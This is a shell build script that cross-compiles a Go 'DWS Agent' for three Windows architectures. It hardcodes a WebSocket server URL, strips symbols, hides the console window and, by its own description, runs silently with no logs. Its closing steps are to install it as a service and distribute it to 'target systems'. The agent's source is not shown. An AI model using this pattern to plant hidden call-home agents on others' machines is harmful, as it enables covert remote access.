#!/bin/bash
# Build DWS Agent for Production - All Windows Architectures
# Run this on Linux/Mac to cross-compile Windows agents

echo "========================================"
echo "Building DWS Agent for Production"
echo "Server: wss://dws-parth.daucu.com"
echo "All Windows Architectures"
echo "========================================"
echo ""

# Create bin directory if it doesn't exist
mkdir -p ../bin/agents

SERVER_URL="wss://dws-parth.daucu.com/ws/client"
BUILD_FLAGS="-s -w -X main.PRODUCTION=true -X main.SERVER_URL=$SERVER_URL -H windowsgui"

echo "Server URL: $SERVER_URL"
echo ""

echo "[1/3] Building for Windows AMD64 (64-bit Intel/AMD)..."
GOOS=windows GOARCH=amd64 go build -ldflags="$BUILD_FLAGS" -o ../bin/agents/dws-agent-amd64.exe .

if [ $? -ne 0 ]; then
    echo "ERROR: AMD64 build failed!"
    exit 1
fi
echo "✓ AMD64 build successful"
echo ""

echo "[2/3] Building for Windows 386 (32-bit Intel/AMD)..."
GOOS=windows GOARCH=386 go build -ldflags="$BUILD_FLAGS" -o ../bin/agents/dws-agent-386.exe .

if [ $? -ne 0 ]; then
    echo "ERROR: 386 build failed!"
    exit 1
fi
echo "✓ 386 build successful"
echo ""

echo "[3/3] Building for Windows ARM64 (ARM-based PCs)..."
GOOS=windows GOARCH=arm64 go build -ldflags="$BUILD_FLAGS" -o ../bin/agents/dws-agent-arm64.exe .

if [ $? -ne 0 ]; then
    echo "ERROR: ARM64 build failed!"
    exit 1
fi
echo "✓ ARM64 build successful"
echo ""

# Copy AMD64 as default
cp ../bin/agents/dws-agent-amd64.exe ../bin/dws-agent.exe

echo "========================================"
echo "SUCCESS! All production builds completed"
echo "========================================"
echo ""
echo "Built files:"
ls -lh ../bin/agents/dws-agent-*.exe
echo ""
echo "Default: ../bin/dws-agent.exe (AMD64)"
echo ""
echo "Configuration:"
echo "  Server:     wss://dws-parth.daucu.com/ws/client"
echo "  Mode:       Production (silent, no logs)"
echo "  Optimized:  Yes (stripped symbols)"
echo ""
echo "Architectures:"
echo "  • AMD64  - 64-bit Intel/AMD (most common)"
echo "  • 386    - 32-bit Intel/AMD (older systems)"
echo "  • ARM64  - ARM-based Windows (Surface Pro X, etc.)"
echo ""
echo "Next steps:"
echo "  1. Transfer files to Windows machines"
echo "  2. Install as service using installer"
echo "  3. Distribute to target systems"
echo ""
